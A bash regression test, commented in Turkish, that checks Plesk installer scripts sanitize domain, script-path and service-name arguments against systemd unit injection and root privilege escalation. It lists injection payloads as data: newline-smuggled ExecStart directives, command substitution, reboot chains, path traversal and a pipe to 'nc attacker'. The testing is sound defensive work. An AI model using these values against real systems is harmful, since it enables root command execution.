#!/usr/bin/env bash
# LOOK — Plesk installer enjeksiyon-regresyon guard'ı (AĞSIZ / Plesk-GEREKTİRMEZ)
#
# Neyi korur: memory'deki privesc bug sınıfı — enable.sh, DOMAIN/SCRIPT/DOC_ROOT
# arglarını TIRNAKSIZ heredoc ile systemd unit'ine yazıyor; sanitizasyon olmadan
# gömülü satır-sonu içeren bir arg, unit'e kendi direktifini (ExecStartPre=...)
# enjekte edip 'sudo systemctl restart' ile ROOT komut koşturur. disable.sh ise
# SVC_NAME'i 'sudo systemctl stop'a veriyor (arbitrary-servis DoS + path-injection).
#
# Bu guard GERÇEK KAYNAKTAN çıkarır: enable.sh/disable.sh içindeki 'tr -cd' beyaz
# listesini ve case-guard'larını source'tan grep'ler. Biri sanitizasyonu zayıflatırsa
# (tr satırını kaldırma / charset genişletme / case guard silme) test KIRMIZI olur.
#
# Çalıştırma:  bash cpp/tests/_plesk_inject_test.sh
# CI-feasible: yalnız bash + coreutils (tr/grep/sed). Plesk, ağ, root GEREKMEZ.

set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
ENABLE="$HERE/../../platforms/plesk/htdocs/scripts/enable.sh"
DISABLE="$HERE/../../platforms/plesk/htdocs/scripts/disable.sh"

FAIL=0
pass() { printf '  \033[32mPASS\033[0m %s\n' "$1"; }
fail() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; FAIL=1; }

[ -f "$ENABLE" ]  || { echo "enable.sh bulunamadı: $ENABLE"; exit 2; }
[ -f "$DISABLE" ] || { echo "disable.sh bulunamadı: $DISABLE"; exit 2; }

# --- Kaynaktan sanitizasyon charset'ini ÇIKAR (test source'a bağlı kalsın) ---
# Satır kalıbı:  DOMAIN=$(printf '%s' "$DOMAIN" | tr -cd 'A-Za-z0-9.-')
extract_charset() { # <file> <varname>
    sed -n "s/^[[:space:]]*$2=\$(printf '%s' \"\$$2\" | tr -cd '\([^']*\)').*/\1/p" "$1" | head -1
}

DOMAIN_CS="$(extract_charset "$ENABLE" DOMAIN)"
SCRIPT_CS="$(extract_charset "$ENABLE" SCRIPT)"
DIS_SVC_CS="$(extract_charset "$DISABLE" SVC_NAME)"

echo "== 1) Sanitizasyon satırları kaynakta MEVCUT mu (sessiz-kaldırma guard'ı) =="
[ -n "$DOMAIN_CS" ]  && pass "enable.sh DOMAIN tr -cd '$DOMAIN_CS'"   || fail "enable.sh DOMAIN tr -cd satırı YOK (sanitizasyon kaldırılmış?)"
[ -n "$SCRIPT_CS" ]  && pass "enable.sh SCRIPT tr -cd '$SCRIPT_CS'"   || fail "enable.sh SCRIPT tr -cd satırı YOK"
[ -n "$DIS_SVC_CS" ] && pass "disable.sh SVC_NAME tr -cd '$DIS_SVC_CS'" || fail "disable.sh SVC_NAME tr -cd satırı YOK"

# Yeni satır ("\n") içeren gerçek payload'lar — printf ile üretilir.
PAYLOADS=(
  "look.com"                                   # temiz (kontrol)
  $'look.com\nExecStartPre=/bin/touch /tmp/pwn'  # SATIR-SONU unit enjeksiyonu (asıl privesc)
  $'look.com\n[Service]\nExecStart=/bin/sh -c reboot'
  'look.com; touch /tmp/pwn'                   # komut ayırıcı
  'look.com$(touch /tmp/pwn)'                  # komut ikamesi
  'look.com`touch /tmp/pwn`'                   # backtick
  'look.com && reboot'                         # && zinciri
  'look.com | nc attacker 9'                   # pipe
  '../../etc/systemd/system/evil'              # traversal
  $'look.com\r\nExecStart=/evil'               # CRLF
)

# Bir değerin systemd-unit satırına GÜVENLE gömülebilir olması: satır-sonu YOK +
# kabuk/unit'i bozacak metakarakter YOK. tr beyaz-listesi bunu doğal sağlar.
has_dangerous() { # <string>  -> 0 (tehlikeli var), 1 (temiz)
    printf '%s' "$1" | LC_ALL=C grep -q '[^A-Za-z0-9._/-]' && return 0
    case "$1" in *$'\n'*|*$'\r'*) return 0;; esac
    return 1
}

echo "== 2) enable.sh DOMAIN sanitizasyonu enjeksiyonu ÖLDÜRÜYOR mu =="
for p in "${PAYLOADS[@]}"; do
    clean="$(printf '%s' "$p" | tr -cd "$DOMAIN_CS")"
    # Rendered unit satırı: Description=LOOK FastCGI - <clean>  (tek satır kalmalı)
    lines="$(printf 'Description=LOOK FastCGI - %s\n' "$clean" | wc -l | tr -d ' ')"
    label="$(printf '%s' "$p" | tr '\n\r' '__')"
    if has_dangerous "$clean"; then
        fail "DOMAIN temizlenmiş değer hâlâ tehlikeli: [$clean]  <- [$label]"
    elif [ "$lines" != "1" ]; then
        fail "DOMAIN satır-sonu enjeksiyonu geçti ($lines satır)  <- [$label]"
    else
        pass "DOMAIN nötralize: [$label] -> [$clean]"
    fi
done

echo "== 3) enable.sh SCRIPT: tr metakarakteri strip + '..'/prefix case-guard'ları var =="
# SCRIPT charset '/' ve '.' içerir → '..' tr'den GEÇER; ekstra case-guard şart.
grep -Eq 'case[[:space:]]+"\$SCRIPT"[[:space:]]+in[[:space:]]+\*\.\.\*' "$ENABLE" \
    && pass "SCRIPT '..' traversal case-guard mevcut" \
    || fail "SCRIPT '..' traversal case-guard KAYIP (tr '..'yi geçirir!)"
grep -q '/var/www/vhosts/' "$ENABLE" \
    && pass "SCRIPT /var/www/vhosts prefix zorlaması mevcut" \
    || fail "SCRIPT prefix zorlaması KAYIP"
for p in $'x\nExecStart=/evil' 'x;reboot' 'x$(id)' 'x`id`'; do
    clean="$(printf '%s' "$p" | tr -cd "$SCRIPT_CS")"
    label="$(printf '%s' "$p" | tr '\n\r' '__')"
    has_dangerous "$clean" && fail "SCRIPT tehlikeli kaldı: [$clean] <- [$label]" \
                           || pass "SCRIPT metakarakter strip: [$label] -> [$clean]"
done

echo "== 4) disable.sh: SVC_NAME look-* zorlaması + metakarakter strip =="
grep -Eq 'look-\*\)' "$DISABLE" \
    && pass "disable.sh look-* case-guard mevcut" \
    || fail "disable.sh look-* case-guard KAYIP (arbitrary systemctl stop!)"
for p in $'sshd\nreboot' 'look-x;rm' 'look-../../evil' 'mariadb'; do
    clean="$(printf '%s' "$p" | tr -cd "$DIS_SVC_CS")"
    label="$(printf '%s' "$p" | tr '\n\r' '__')"
    has_dangerous "$clean" && fail "SVC tehlikeli kaldı: [$clean] <- [$label]" \
                           || pass "SVC metakarakter strip: [$label] -> [$clean]"
done

# --- POZİTİF KONTROL: sanitizasyonu KALDIR → privesc payload'ı GEÇER → guard bunu görür ---
echo "== 5) POZİTİF KONTROL (sanitizasyon bozuk olsaydı test kırmızı olurdu) =="
evil=$'look.com\nExecStartPre=/bin/touch /tmp/pwn'
raw_lines="$(printf 'Description=LOOK FastCGI - %s\n' "$evil" | wc -l | tr -d ' ')"
if has_dangerous "$evil" && [ "$raw_lines" -gt 1 ]; then
    pass "sanitizasyonsuz payload GERÇEKTEN enjekte ediyor ($raw_lines satır) → guard ayırt edici"
else
    fail "pozitif kontrol beklenen enjeksiyonu üretmedi — test ayırt edici DEĞİL"
fi

echo
[ "$FAIL" = 0 ] && { echo "== TÜM ENJEKSİYON GUARD'LARI GEÇTİ =="; exit 0; } \
               || { echo "== ENJEKSİYON GUARD BAŞARISIZ =="; exit 1; }
